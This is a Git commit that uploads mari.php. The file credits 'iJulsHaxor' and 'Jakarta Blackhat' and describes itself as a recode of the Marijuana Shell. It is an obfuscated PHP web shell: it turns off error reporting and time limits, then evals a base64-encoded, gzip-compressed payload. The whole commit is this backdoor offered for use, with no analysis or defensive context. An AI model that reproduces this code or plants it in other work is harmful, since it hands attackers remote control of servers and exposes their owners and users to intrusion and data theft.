82057a9ca982ec7e671f7abfd67bb855291a9be0
egaa24 <67776572+egaa24@users.noreply.github.com>
2021-07-18 04:30:49 +0700

    Add files via upload

---
+++ mari.php
@@ -0,0 +1,12 @@
+<?php
+/*
+Author : iJulsGanss//iJulsHaxor//x0verKiLL
+Email  : h4x.org@yandex.com
+Recode From Marijuana Shell <3
+Thanks to My Family : Jakarta Blackhat <3
+*/
+session_start();
+error_reporting(0);
+set_time_limit(0);
+date_default_timezone_set("Asia/Jakarta");
+eval(gzinflate(base64_decode("DcFJkoIwAADAv3hiioPsak15EJBFiCsa5GIhBAlIRBIJ+PqZbtSnT+HxxaR4pgwJlHW37sVkVbinFBnaLUfZK0fCBNJqk1x9vlrZh2LqHAfZqn3AyP1q42h8XIbQlrTHwV87LvdPYWN8P4vFUSoaCIh8DZWTn+n1Zb/7EvKgfdgnET/BSolbs4x9LNHYoQMAIx9no0e9kSPSmJmzhWXQ7exkd26tLDHP7tHs3sCuZ9dIqeTexFVdZmowdSWeZCafTzdeHOVQb7cA6E/Lhf5ahoR7SbFXJBUXlctEWU07XwZ5zJzzNDIsayuqJC88LGksHaLdXAxnWqSe7wexSTeIXlqIZpRpQTkGWWwX8vAqrY22RxfXgZIh9pS90hUlGH8UoLfr93ps3N7owlQFgbYvh8aM+hprnqcTdZh/Cubw5XLy8+/3Dw=="))); ?>
